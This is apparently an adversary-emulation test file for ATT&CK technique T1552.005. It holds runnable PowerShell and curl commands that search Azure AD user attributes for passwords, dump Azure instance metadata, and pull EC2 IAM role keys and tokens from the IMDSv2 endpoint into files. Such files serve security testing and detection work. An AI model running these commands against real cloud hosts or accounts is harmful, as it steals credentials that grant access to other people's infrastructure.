attack_technique: T1552.005
display_name: 'Unsecured Credentials: Cloud Instance Metadata API'
atomic_tests:
- name: Azure - Search Azure AD User Attributes for Passwords
  auto_generated_guid: ae9b2e3e-efa1-4483-86e2-fae529ab9fb6
  description: |
    This test uses the MSOnline Powershell module to retrieve all user attributes for a specified account, which can sometimes contain unsecured credentials. 
    Upon successful execution, this test will scan all user attributes for any strings containing "password".
    Those unsecured credentials will be output to a text file, as well as the account that they are associated with and the user attribute in which they were found. 
    See: https://github.com/dafthack/CloudPentestCheatsheets/blob/master/cheatsheets/Azure.md
  supported_platforms:
  - azure-ad
  input_arguments:
    username:
      description: Azure AD username
      type: string
      default:
    password:
      description: Azure AD password
      type: string
      default: T1082Az
  dependency_executor_name: powershell
  dependencies:
  - description: |
      The MSOnline module must be installed.
    prereq_command: |
      if (get-command Get-MsolUser -erroraction silentlycontinue){exit 0} else {exit 1}
    get_prereq_command: |
      install-module MSOnline
  executor:
    command: |
      import-module msonline
      $Password = ConvertTo-SecureString -String "#{password}" -AsPlainText -Force
      $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList "#{username}", $Password
      Connect-MsolService -Credential $Credential
      $users = Get-MsolUser -All;
      foreach($user in $users)
      {$props = @();$user | Get-Member | foreach-object{$props+=$_.Name}; 
      foreach($prop in $props)
      {if($user.$prop -like "*password*")
      {("[*]" + $user.UserPrincipalName + "[" + $prop + "]" + " : " + $user.$prop) | out-file -filepath $env:temp\T1552.005Test1.txt -append -force}}}
      get-content -path $env:temp\T1552.005Test1.txt -erroraction silentlycontinue
    cleanup_command: |
      remove-item $env:temp\T1552.005Test1.txt -force -erroraction silentlycontinue
    name: powershell
    elevation_required: true
- name: Azure - Dump Azure Instance Metadata from Virtual Machines
  auto_generated_guid: cc99e772-4e18-4f1f-b422-c5cdd1bfd7b7
  description: |
    This test invokes a web request to the default Instance Metadata API of 169.254.169.254 in order to dump the data contained within it to a file. 
    See: https://www.sans.org/blog/cloud-instance-metadata-services-imds-/
  supported_platforms:
  - iaas:azure
  input_arguments:
    output_file:
      description: File to output metadata to
      type: string
      default: $env:temp\T1552.005Test2.txt
  executor:
    command: |
      Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | ConvertTo-Json -Depth 64 > #{output_file}
    cleanup_command: |
      remove-item #{output_file} -force -erroraction silentlycontinue
    name: powershell
- name: AWS - Retrieve EC2 IAM Role Credentials via IMDSv2
  auto_generated_guid: c9aa1ca4-04df-4623-adac-1f199ca5ce42
  description: |
    Simulates an adversary on a compromised EC2 instance abusing the Instance Metadata Service Version 2
    (IMDSv2) to steal the temporary IAM role credentials assigned to the instance. A session token is first
    requested with a PUT to `/latest/api/token`, then supplied in the `X-aws-ec2-metadata-token` header to
    read the instance's IAM role name and retrieve that role's `AccessKeyId`, `SecretAccessKey`, and `Token`
    from `/latest/meta-data/iam/security-credentials/`. The harvested credentials are written to a file.
    On a host that is not an EC2 instance the requests to the link-local 169.254.169.254 address time out and
    no credentials are returned.
    See: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instance-metadata-v2-how-it-works.html
  supported_platforms:
  - linux
  - iaas:aws
  input_arguments:
    metadata_endpoint:
      description: Base URL of the EC2 Instance Metadata Service
      type: string
      default: http://169.254.169.254
    token_ttl:
      description: TTL in seconds requested for the IMDSv2 session token
      type: integer
      default: 21600
    output_file:
      description: File the harvested IAM role credentials are written to
      type: path
      default: /tmp/T1552.005_aws_imds_creds.json
  dependency_executor_name: sh
  dependencies:
  - description: |
      curl must be installed.
    prereq_command: |
      if [ -x "$(command -v curl)" ]; then echo "curl is installed"; else echo "curl is NOT installed"; exit 1; fi
    get_prereq_command: |
      if grep -iq "debian\|ubuntu\|kali\|mint" /usr/lib/os-release; then apt update && apt install -y curl; fi
      if grep -iq "rhel\|fedora\|centos\|rocky\|alma" /usr/lib/os-release; then yum install -y curl; fi
  executor:
    command: |
      token=$(curl -s --connect-timeout 2 -m 5 -X PUT "#{metadata_endpoint}/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: #{token_ttl}")
      role=$(curl -s --connect-timeout 2 -m 5 -H "X-aws-ec2-metadata-token: $token" "#{metadata_endpoint}/latest/meta-data/iam/security-credentials/")
      curl -s --connect-timeout 2 -m 5 -H "X-aws-ec2-metadata-token: $token" "#{metadata_endpoint}/latest/meta-data/iam/security-credentials/$role" -o "#{output_file}"
      if [ -s "#{output_file}" ]; then cat "#{output_file}"; else echo "No IAM credentials returned (host is not an EC2 instance with an attached role)"; fi
    cleanup_command: |
      rm -f "#{output_file}"
    name: sh
    elevation_required: false
